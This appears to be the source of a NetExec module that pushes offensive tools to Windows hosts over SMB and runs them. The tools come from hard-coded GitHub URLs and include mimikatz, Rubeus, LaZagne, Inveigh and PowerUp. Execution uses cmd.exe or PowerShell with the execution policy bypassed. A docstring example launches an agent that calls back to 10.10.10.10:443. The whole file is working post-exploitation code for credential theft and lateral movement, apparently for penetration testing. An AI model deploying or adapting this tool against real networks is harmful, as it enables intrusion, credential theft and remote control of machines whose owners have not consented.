#!/usr/bin/env python3

import os
import requests
import hashlib
from nxc.paths import DATA_PATH
from nxc.helpers.logger import highlight

class NXCModule:
    """Module by @FaganAfandiyev"""

    name = "toolexec"
    description = "Transfers and executes utilities for usage in a new environment."
    supported_protocols = ["smb"]
    opsec_safe = False
    multiple_hosts = True

    def options(self, context, module_options):
        r"""
        Transfers and executes utilities in a new environment.

        Modes:
        - all       → Transfers all enum + exploit tools
        - enum      → Transfers enumeration tools
        - exploit   → Transfers exploitation tools
        - custom    → Transfers user-defined local files or URLs
        - update    → Downloads the latest toolset to LOCAL_DIR

        Options:
        -------
        MODE            Deployment mode (default: all)
        DIR             Remote target path (default: C:\\Windows\\Tasks\\)
        OVERWRITE       Overwrite existing files on target (default: False)
        CUSTOM          Comma-separated file paths, URLs, or built-in tool names
        EXEC            Execute tools on target (default: False)
        ARGS            Arguments to pass to tools
        UPDATE          Download latest tools from URLs (default: False)
        LOCAL_DIR       Where tools are stored locally (default: ~/.nxc/data/toolexec)

        Notes
        -----
        - Tools are never downloaded automatically. You must pass UPDATE=True.
        - This makes the module usable without internet access.
        - To extend tools, edit `get_tools_based_on_mode()` dictionary.

        Examples
        --------
        nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M toolexec -o MODE=enum
        nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M toolexec -o MODE=enum DIR=C:\\Windows\\Temp\\
            nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M toolexec -o MODE=custom CUSTOM=/path/to/tools/
        nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M toolexec -o MODE=custom CUSTOM=/path/to/agent.exe
        nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M toolexec -o MODE=custom CUSTOM=https://example.com/tool1.exe,https://example.com/tool2.exe
        nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M toolexec -o MODE=custom CUSTOM=mimikatz
        nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M toolexec -o MODE=custom CUSTOM=https://example.com/tool.exe EXEC=True ARGS='--help'
        nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M toolexec -o MODE=all OVERWRITE=True
        nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M toolexec -o UPDATE=True
        nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M toolexec -o MODE=custom CUSTOM=/path/to/agent.exe EXEC=True ARGS='-connect 10.10.10.10:443'
        """
        self.MODE = module_options.get("MODE", "all").lower()
        self.location = module_options.get("DIR", "C:\\Windows\\Tasks\\").replace("/", "\\")
        if not self.location.endswith("\\"):
            self.location += "\\"
        self.overwrite = module_options.get("OVERWRITE", "False").lower() == "true"
        self.EXEC = module_options.get("EXEC", "False").lower() == "true"
        self.ARGS = module_options.get("ARGS", "")
        self.UPDATE = module_options.get("UPDATE", "False").lower() == "true"
        self.LOCAL_DIR = module_options.get("LOCAL_DIR", os.path.join(DATA_PATH, "toolexec"))
        self.internet_prompt_shown = False

        custom_tools = module_options.get("CUSTOM", "")
        self.custom_tools = [t.strip() for t in custom_tools.split(",")] if custom_tools else []

        if self.custom_tools and "MODE" not in module_options:
            self.MODE = "custom"

        os.makedirs(self.LOCAL_DIR, exist_ok=True)

        if self.MODE == "custom" and not self.custom_tools:
            context.log.fail("CUSTOM option is required when MODE is set to 'custom'.")
            return

    def on_admin_login(self, context, connection):
        try:
            connection.conn.listPath("C$", self.location.replace("C:\\", ""))
        except Exception:
            context.log.fail(f"Target directory does not exist: {self.location}")
            return
        requires_internet = self.UPDATE or any(t.startswith(("http://", "https://")) for t in self.custom_tools)
        if requires_internet and not self.prompt_for_internet_connection(context):
            context.log.fail("Operation canceled by user.")
            return
        if self.custom_tools and self.MODE != "custom":
            ans = input(highlight(f"[!] CUSTOM tools specified but MODE is '{self.MODE}'. Transfer custom tools too? [Y/n] ", "yellow"))
            transfer_custom = ans.lower() in ["y", "yes", ""]
        else:
            transfer_custom = False

        if self.MODE in ["enum", "exploit", "all"]:
            self.deploy_tools(context, connection, self.MODE)

        if self.MODE == "custom":
            self.deploy_custom_tools(context, connection)

        if transfer_custom:
            self.deploy_custom_tools(context, connection)

        if self.EXEC:
            self.execute_transferred_files(context, connection)

    def download_and_verify_tool(self, context, tool, local_path):
        filename = os.path.basename(local_path)
        expected_md5 = tool.get("md5", "")
        try:
            response = requests.get(tool["url"])
            with open(local_path, "wb") as f:
                f.write(response.content)
            if expected_md5 and not self.UPDATE and self.calculate_md5(local_path) != expected_md5:
                context.log.fail(f"MD5 mismatch for {filename}")
                os.remove(local_path)
                return False
            return True
        except Exception as e:
            context.log.fail(f"Download failed for {filename}: {e}")
            return False
    def prompt_for_internet_connection(self, context):
        if not self.internet_prompt_shown:
            self.internet_prompt_shown = True
            ans = input(highlight("[!] This will create an internet connection. Do you want to continue? [Y/n] ", "red"))
            return ans.lower() in ["y", "yes", ""]
        return True

    def calculate_md5(self, path):
        hash_md5 = hashlib.md5()
        with open(path, "rb") as f:
            for chunk in iter(lambda: f.read(4096), b""):
                hash_md5.update(chunk)
        return hash_md5.hexdigest()

    def get_tools_based_on_mode(self, mode=None):
        mode = mode or self.MODE
        all_tools = {
            "enum": [
                {"name": "adpeas", "url": "https://raw.githubusercontent.com/61106960/adPEAS/refs/heads/main/adPEAS.ps1", "md5": "86a9fb7763c678004da1b3baf78110cf"},
                {"name": "winpeas", "url": "https://github.com/peass-ng/PEASS-ng/raw/refs/heads/master/winPEAS/winPEASbat/winPEAS.bat", "md5": "1755c3e775ed916e01509d5643387705"},
                {"name": "certify", "url": "https://github.com/jakobfriedl/precompiled-binaries/raw/refs/heads/main/LateralMovement/CertificateAbuse/Certify.exe", "md5": "ae8a48081082b8fe467bf218fa9964e6"},
                {"name": "lazagne", "url": "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe", "md5": "5075f994390f9738e8e69f4de09debe6"},
                {"name": "sharphound", "url": "https://github.com/SpecterOps/SharpHound/releases/download/v2.6.5/SharpHound_v2.6.5_windows_x86.zip", "md5": "0ff79a9385854dd85dbf43283ca6c7ee"},
                {"name": "pingcastle", "url": "https://github.com/netwrix/pingcastle/releases/download/3.3.0.1/PingCastle_3.3.0.1.zip", "md5": "5e083fddda732ea2e3fd6a322fe86fa6"}
            ],
            "exploit": [
                {"name": "rubeus", "url": "https://github.com/jakobfriedl/precompiled-binaries/raw/refs/heads/main/LateralMovement/Rubeus.exe", "md5": "ef92a49906051502f0208d58cb53a5ed"},
                {"name": "whisker", "url": "https://github.com/jakobfriedl/precompiled-binaries/raw/refs/heads/main/LateralMovement/Whisker.exe", "md5": "69de9a014c22108256f0854d1f76627e"},
                {"name": "powerup", "url": "https://github.com/jakobfriedl/precompiled-binaries/raw/refs/heads/main/Scripts/PowerUp.ps1", "md5": "87a2c56f0021f8592774c25158cfedfe"},
                {"name": "inveigh", "url": "https://github.com/jakobfriedl/precompiled-binaries/raw/refs/heads/main/Scripts/Inveigh.ps1", "md5": "76ba579f756fa0900dd0d031f87eb13d"},
                {"name": "powermad", "url": "https://github.com/jakobfriedl/precompiled-binaries/raw/refs/heads/main/Scripts/Powermad.ps1", "md5": "9391e3a9f3e2d3288eeeb3561098fb30"},
                {"name": "mimikatz", "url": "https://github.com/jakobfriedl/precompiled-binaries/raw/refs/heads/main/Credentials/mimikatz.exe", "md5": "e930b05efe23891d19bc354a4209be3e"}
            ]
        }
        all_tools["all"] = all_tools["enum"] + all_tools["exploit"]
        return all_tools.get(mode, [])

    def deploy_tools(self, context, connection, mode):
        tools = self.get_tools_based_on_mode(mode)
        for tool in tools:
            filename = os.path.basename(tool["url"])
            local_path = os.path.join(self.LOCAL_DIR, filename)
            if self.UPDATE or not os.path.exists(local_path):
                if not self.prompt_for_internet_connection(context):
                    context.log.fail("Operation canceled by user.")
                    return
                self.download_and_verify_tool(context, tool, local_path)
                context.log.display(f"Updated {filename}")
            self.transfer_tool_to_target(context, connection, local_path)

    def deploy_custom_tools(self, context, connection):
        known = {t["name"].lower(): t for t in self.get_tools_based_on_mode("all")}
        for tool in self.custom_tools:
            name = os.path.basename(tool).lower()
            if name in known:
                t = known[name]
                filename = os.path.basename(t["url"])
                local_path = os.path.join(self.LOCAL_DIR, filename)
                if self.UPDATE or not os.path.exists(local_path):
                    self.download_and_verify_tool(context, t, local_path)
                self.transfer_tool_to_target(context, connection, local_path)
            elif tool.startswith(("http://", "https://")):
                filename = os.path.basename(tool)
                local_path = os.path.join(self.LOCAL_DIR, filename)
                if self.UPDATE or not os.path.exists(local_path):
                    self.download_and_verify_tool(context, {"url": tool, "md5": ""}, local_path)
                self.transfer_tool_to_target(context, connection, local_path)
            elif os.path.isfile(tool):
                self.transfer_tool_to_target(context, connection, tool)
            else:
                context.log.fail(f"Invalid CUSTOM path, name, or URL: {tool}")

    def transfer_tool_to_target(self, context, connection, local_path):
        filename = os.path.basename(local_path)
        remote_path = f"{self.location}{filename}"
        if self.check_file_exists_on_target(connection, remote_path) and not self.overwrite:
            context.log.display(f"{filename} exists. Skipping. Use OVERWRITE=True to overwrite.")
            return
        try:
            with open(local_path, "rb") as f:
                connection.conn.putFile("C$", remote_path.replace("C:\\", ""), f.read)
            context.log.display(f"Uploaded {filename} to {remote_path}")
        except Exception as e:
            context.log.fail(f"Upload failed for {filename}: {e}")

    def check_file_exists_on_target(self, connection, remote_path):
        try:
            connection.conn.listPath("C$", remote_path.replace("C:\\", ""))
            return True
        except Exception:
            return False

    def execute_transferred_files(self, context, connection):
        context.log.display("Executing transferred files...")
        if self.MODE == "custom":
            files = [os.path.basename(t) for t in self.custom_tools]
        else:
            tools = self.get_tools_based_on_mode()
            files = [os.path.basename(t["url"]) for t in tools]
        for f in files:
            if f.endswith((".exe", ".bat", ".cmd")):
                cmd = f"cmd.exe /c {self.location}{f} {self.ARGS}"
            elif f.endswith(".ps1"):
                cmd = f"powershell.exe -ExecutionPolicy Bypass -File {self.location}{f} {self.ARGS}"
            else:
                continue
            self.execute_command_on_target(context, connection, cmd)

    def execute_command_on_target(self, context, connection, command):
        try:
            output = connection.execute(command, True)
            for line in output.splitlines():
                context.log.highlight(line)
        except Exception as e:
            context.log.fail(f"Execution failed: {e}")
